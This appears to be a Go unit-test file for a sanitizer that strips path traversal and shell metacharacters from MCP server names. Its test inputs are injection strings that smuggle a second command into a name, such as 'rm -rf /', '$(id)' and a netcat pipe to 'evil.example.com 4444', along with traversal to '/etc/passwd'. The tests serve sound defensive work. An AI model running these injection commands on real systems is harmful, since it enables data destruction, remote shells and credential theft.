package orchestrator

import (
	"strings"
	"testing"
)

// ---------------------------------------------------------------------------
// exec_mcp_build.go — sanitizeMCPName.
//
// Security-critical helper. Source comment is explicit: "prevents
// credential theft via prompt injection reading filesystem". Used to
// derive on-disk filenames for MCP server packages written into the
// container. A malicious server name like "../../etc/passwd" or
// "x;rm -rf /" must be defanged before it becomes part of a shell
// command or a file path.
//
// The contract is:
//   1. Reduce to path.Base (strip directory components)
//   2. Strip characters outside [a-zA-Z0-9._@-]
//   3. If the result is empty / "." / ".." substitute "mcp-server"
//
// A regression in any branch could resurrect a real injection path. We
// have a benchmark but no behaviour test — adding one closes the gap.
// ---------------------------------------------------------------------------

func TestSanitizeMCPName_NormalNamesPassthrough(t *testing.T) {
	// Well-formed names from the public registries must round-trip
	// unchanged — a regression that stripped legitimate chars would
	// silently rename packages on disk and break the runtime lookup.
	cases := []struct {
		in, want string
	}{
		{"filesystem", "filesystem"},
		{"github", "github"},
		{"postgres", "postgres"},
		{"slack", "slack"},
		{"server-fs", "server-fs"},               // hyphen
		{"server_fs", "server_fs"},               // underscore
		{"server.v2", "server.v2"},               // dot
		{"@scope-pkg", "@scope-pkg"},             // @ allowed (npm scope leading)
		{"a", "a"},                               // single char
		{"123-abc-XYZ_v0.1", "123-abc-XYZ_v0.1"}, // mixed
	}
	for _, tc := range cases {
		t.Run(tc.in, func(t *testing.T) {
			if got := sanitizeMCPName(tc.in); got != tc.want {
				t.Errorf("sanitizeMCPName(%q) = %q, want %q", tc.in, got, tc.want)
			}
		})
	}
}

func TestSanitizeMCPName_PathTraversal_StrippedToBasename(t *testing.T) {
	// path.Base strips directory components. Pin every common
	// traversal shape — an LLM-generated name might emit any of these
	// and the security contract says they must NOT escape the install
	// directory.
	cases := []struct {
		name, in, want string
	}{
		{"absolute-etc", "/etc/passwd", "passwd"},
		{"relative-dotdot", "../../etc/passwd", "passwd"},
		{"nested", "foo/bar/baz", "baz"},
		{"trailing-slash", "foo/bar/", "bar"},
		{"single-dotdot", "..", "mcp-server"}, // ".." → empty alias → fallback
		{"single-dot", ".", "mcp-server"},     // "." → empty alias → fallback
		{"only-slashes", "///", "mcp-server"}, // path.Base("///") = "/" stripped → ""
		{"home-tilde", "~/secrets", "secrets"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := sanitizeMCPName(tc.in)
			if got != tc.want {
				t.Errorf("sanitizeMCPName(%q) = %q, want %q (path traversal must be defanged)", tc.in, got, tc.want)
			}
		})
	}
}

func TestSanitizeMCPName_ShellMetacharacters_Stripped(t *testing.T) {
	// Every shell metacharacter that could break out of a quoted
	// context must be stripped. These names eventually get spliced
	// into shell commands inside the container — a single un-defanged
	// $(...) is the difference between "package installed at known
	// path" and "arbitrary command execution as the agent user".
	cases := []struct {
		name, in, want string
	}{
		{"semicolon", "pkg;rm -rf /", "pkgrm-rf"},
		{"backtick", "pkg`whoami`", "pkgwhoami"},
		{"dollar-paren", "pkg$(id)", "pkgid"},
		// NOTE: "." is in the safe set, so the dots in
		// "evil.example.com" survive. Spaces and "|" don't.
		{"pipe", "pkg|nc evil.example.com 4444", "pkgncevil.example.com4444"},
		{"redirect", "pkg>etc-passwd", "pkgetc-passwd"},
		{"redirect-in", "pkg<input", "pkginput"},
		{"single-quote", "pkg'evil'", "pkgevil"},
		{"double-quote", "pkg\"evil\"", "pkgevil"},
		{"backslash", `pkg\evil`, "pkgevil"},
		{"newline", "pkg\nrm -rf /", "pkgrm-rf"},
		{"null-byte", "pkg\x00malicious", "pkgmalicious"},
		{"ansi-escape", "pkg\x1b[31m", "pkg31m"},
		{"unicode-fullwidth-slash", "pkg／etc", "pkgetc"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := sanitizeMCPName(tc.in)
			if got != tc.want {
				t.Errorf("sanitizeMCPName(%q) = %q, want %q (shell metachar must be stripped)", tc.in, got, tc.want)
			}
			// Belt and suspenders: regardless of expected value, the
			// output must never contain any of these metacharacters.
			for _, ch := range []string{";", "`", "$", "|", ">", "<", "\"", "'", `\`, "\n", "\x00"} {
				if strings.Contains(got, ch) {
					t.Errorf("output %q still contains metachar %q from input %q", got, ch, tc.in)
				}
			}
		})
	}
}

func TestSanitizeMCPName_EmptyOrAllUnsafeFallsBackToDefault(t *testing.T) {
	// Source: `if safe == "" || safe == "." || safe == ".."` →
	// "mcp-server". Pin the empty + all-unsafe cases so an empty file
	// name never reaches the on-disk path layer (would land at the
	// install dir itself and clobber unrelated state).
	cases := []struct {
		name, in string
	}{
		{"empty", ""},
		{"only-spaces", "   "},
		{"only-metachars", "!@#$%^&*()"}, // @ kept, others stripped — carve-out checked below
		{"only-slashes", "////"},
		{"only-pipes", "|||"},
		{"only-semicolons", ";;;"},
		{"single-dot", "."},     // explicit fallback case
		{"single-dotdot", ".."}, // explicit fallback case
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := sanitizeMCPName(tc.in)
			if got == "" {
				t.Errorf("sanitizeMCPName(%q) = \"\" — must fall back to \"mcp-server\" to avoid empty file names", tc.in)
			}
			// Single "@" survives the regex; the only-metachars case
			// reduces to "@" which is non-empty and allowed. Document
			// the carve-out explicitly.
			if tc.in == "!@#$%^&*()" {
				if got != "@" {
					t.Errorf("only-metachars: got %q, want %q (@ alone survives the [^a-zA-Z0-9._@-] regex)", got, "@")
				}
				return
			}
			if got != "mcp-server" {
				t.Errorf("sanitizeMCPName(%q) = %q, want \"mcp-server\" fallback", tc.in, got)
			}
		})
	}
}

func TestSanitizeMCPName_ThreeDots_PassesThrough(t *testing.T) {
	// Documented carve-out: only "." and ".." are in the fallback
	// guard. "..." (three dots) survives — it's not a Unix special
	// path component (no parent-of-parent semantics), so allowing it
	// is safe. Pin so a future "broaden the fallback to N dots" change
	// has to update this test too and consider whether the broader
	// guard is actually needed.
	if got := sanitizeMCPName("..."); got != "..." {
		t.Errorf("sanitizeMCPName(\"...\") = %q, want \"...\" (fallback only catches \".\" and \"..\")", got)
	}
}

func TestSanitizeMCPName_BasenameRunsBeforeStrip(t *testing.T) {
	// Order matters: path.Base FIRST, then strip. A reversal would
	// allow `foo/$(evil)` to become `foo/evil` (slash survives strip
	// after metachar removal). Pin the ordering explicitly.
	got := sanitizeMCPName("dir/$(evil)")
	if got != "evil" {
		t.Errorf("sanitizeMCPName(%q) = %q; want \"evil\" (path.Base must run before regex strip)", "dir/$(evil)", got)
	}
}

func TestSanitizeMCPName_NeverReturnsEmpty(t *testing.T) {
	// Property: for ANY input, the output is non-empty. Downstream
	// callers use this as part of file paths; an empty result would
	// land them at a directory write. Sweep a representative set.
	for _, in := range []string{
		"",
		" ",
		"/",
		"//",
		".",
		"..",
		"...",
		";",
		"`",
		"$()",
		"|||",
		">>>",
		"<<<",
		"!",
		"!@#",
		"\x00",
		"\n\t",
		"\xff\xfe",
		"////\\\\\\\\",
	} {
		if got := sanitizeMCPName(in); got == "" {
			t.Errorf("sanitizeMCPName(%q) returned empty; invariant violated", in)
		}
	}
}

func TestSanitizeMCPName_IsIdempotent(t *testing.T) {
	// Applying sanitizeMCPName twice must equal applying it once.
	// Important because a future refactor that double-wraps for
	// defensive depth must not corrupt already-safe names.
	for _, in := range []string{
		"filesystem", "@scope-pkg", "../../etc/passwd",
		"$(evil)", "", "...", "pkg.v1.2",
	} {
		once := sanitizeMCPName(in)
		twice := sanitizeMCPName(once)
		if once != twice {
			t.Errorf("idempotency broken for %q: once=%q twice=%q", in, once, twice)
		}
	}
}
